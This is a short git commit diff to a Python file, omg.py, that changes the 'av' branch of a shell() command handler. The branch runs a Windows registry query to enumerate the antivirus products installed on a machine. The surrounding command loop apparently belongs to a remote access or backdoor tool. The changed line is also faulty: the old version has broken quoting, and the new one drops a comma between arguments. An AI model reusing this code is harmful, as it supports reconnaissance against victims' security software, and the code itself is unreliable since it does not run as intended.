ad6016e0ecafb30232e313273cb97120292785a2
GodGenesis <110716843+GodGenesis@users.noreply.github.com>
2023-01-23 19:06:11 +0530

    Update omg.py

--- omg.py
+++ omg.py
@@ -361,7 +361,7 @@ def shell():
 
         elif command == 'av':
             try:
-                execute = subprocess.run(["reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Provider\Av" /s /f """], shell=True, stdout=subprocess.PIPE, 
+                execute = subprocess.run(['reg', 'query', '"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Provider\Av"', '/s' '/f""'], shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
                 result = execute.stdout + execute.stderr
